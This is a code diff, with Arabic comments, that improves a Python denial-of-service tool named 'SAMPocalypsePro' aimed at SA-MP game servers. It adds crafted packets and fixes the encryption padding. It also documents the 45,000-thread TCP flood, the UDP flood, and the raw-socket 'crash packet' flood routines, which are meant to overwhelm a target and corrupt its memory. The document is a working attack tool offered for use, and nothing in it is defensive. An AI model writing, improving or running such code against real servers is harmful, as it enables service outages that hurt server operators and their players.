@@ -8,7 +8,8 @@ from Crypto.Cipher import AES
 
 # 0x0. Advanced Configuration
 THREADS = 45000  # زيادة عدد الثريدات
-AES_KEY = b'ThisIsASecretKey'  # مفتاح أقوى
+# مفتاح أقوى بطول 32 بايت
+AES_KEY = b'ThisIsASecretKey1337HelloWorld!!'
 
 class SAMPocalypsePro:
     def __init__(self, target_ip, port):
@@ -24,16 +25,57 @@ class SAMPocalypsePro:
             self.craft_crash_packet()  # حزمة جديدة لتدمير الذاكرة
         ]
 
+    def craft_connect_packet(self):
+        """
+        إنشاء حزمة الاتصال.
+        يمكن تعديل محتويات الحزمة بحسب المتطلبات.
+        """
+        # على سبيل المثال، إرسال معرّف ثابت مع بعض البيانات الإضافية
+        return struct.pack('!4sI', b'SAMP', 0x01020304) + b'\x00' * 16
+
+    def craft_rcon_payload(self):
+        """
+        إنشاء حزمة rcon payload مع معرّف عشوائي وبعض البيانات.
+        """
+        random_id = random.randint(0, 0xFFFFFFFF)
+        return struct.pack('!4sI', b'RCON', random_id) + b'\x01\x02\x03\x04'
+
+    def craft_fake_playerlist(self):
+        """
+        إنشاء حزمة قائمة اللاعبين المزيفة.
+        """
+        players = [b'Player1', b'Player2', b'Player3']
+        packet = struct.pack('!4sH', b'PLAY', len(players))
+        for p in players:
+            packet += p.ljust(16, b'\0')  # تعبئة اسم اللاعب ليصبح بطول 16 بايت
+        return packet
+
     def craft_crash_packet(self):
+        """
+        إنشاء حزمة تُستخدم لمحاولة تدمير الذاكرة.
+        """
         return struct.pack('!4sI', b'SAMP', 0xDEADBEEF) + b'\xFF' * 1024
 
     def craft_malformed_packet(self):
+        """
+        إنشاء حزمة خاطئة الصيغة.
+        """
         return struct.pack('!4sH', b'SAMP', 0xFFFF) + bytes([random.randint(0, 255) for _ in range(512)])
 
     def encrypt_packet(self, packet):
-        return self.cipher.encrypt(packet.ljust(64, b'\0'))
+        """
+        تشفير الحزمة باستخدام AES في وضع ECB.
+        يتم تعبئة الحزمة لتصبح بطول مضاعف للـ 16 بايت.
+        """
+        # تعبئة الحزمة لتصبح بطول مضاعف لـ 16
+        if len(packet) % 16 != 0:
+            packet = packet.ljust((len(packet) // 16 + 1) * 16, b'\0')
+        return self.cipher.encrypt(packet)
 
     def tcp_flood(self):
+        """
+        تنفيذ هجوم TCP Flood.
+        """
         while self.running:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,35 +85,48 @@ class SAMPocalypsePro:
                     sock.send(self.encrypt_packet(random.choice(self.packet_variants)))
                 self.zombies += 2.3
                 sock.close()
-            except:
+            except Exception as e:
+                # يمكن طباعة الاستثناء لتتبع الأخطاء
                 pass
 
     def raw_attack(self):
-        crash_packet = self.craft_crash_packet() * 10  # حزمة تدمير x10
+        """
+        تنفيذ هجوم باستخدام Raw Socket.
+        (قد يتطلب صلاحيات الروت)
+        """
+        crash_packet = self.craft_crash_packet() * 10  # تكرار الحزمة 10 مرات
         while self.running:
             try:
-                with socket.socket(socket.AF_INET, socket.SOCK_RAW) as sock:
-                    for _ in range(100):  # إرسال 100 حزمة/ثانية
-                        sock.sendto(crash_packet, self.target)
-                        self.zombies += 4.7
-            except:
+                # إنشاء مقبس raw مع تحديد البروتوكول
+                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+                for _ in range(100):  # إرسال 100 حزمة/ثانية
+                    sock.sendto(crash_packet, self.target)
+                    self.zombies += 4.7
+                sock.close()
+            except Exception as e:
                 pass
 
     def adaptive_flood(self):
+        """
+        تنفيذ هجوم UDP Flood.
+        """
         while self.running:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.sendto(self.encrypt_packet(random.choice(self.packet_variants)), self.target)
                 self.zombies += 3.1
                 sock.close()
-            except:
+            except Exception as e:
                 pass
 
     def stats_monitor(self):
+        """
+        مراقبة تقدم الهجوم وعرض الإحصائيات.
+        """
         print(f"[+] Nuclear launch detected for {self.target[0]}:{self.target[1]}")
         while self.running:
             time.sleep(0.3)
-            estimated_damage = min(90, int(self.zombies/350))  # معادلة تدمير محسنة
+            estimated_damage = min(90, int(self.zombies / 350))  # معادلة تدمير محسنة
             print(f"\r[+] Annihilation progress: {estimated_damage}%", end='')
             sys.stdout.flush()
 
@@ -81,7 +136,7 @@ if __name__ == "__main__":
         sys.exit(1)
 
     target_ip = sys.argv[1]
-    port = int(sys.argv[2]) if len(sys.argv) >=3 else 7777
+    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 7777
 
     attack = SAMPocalypsePro(target_ip, port)
 
@@ -91,7 +146,7 @@ if __name__ == "__main__":
         for method in attack_methods:
             threading.Thread(target=method, daemon=True).start()
 
-    threading.Thread(target=attack.stats_monitor).start()
+    threading.Thread(target=attack.stats_monitor, daemon=True).start()
 
     try:
         while True: 
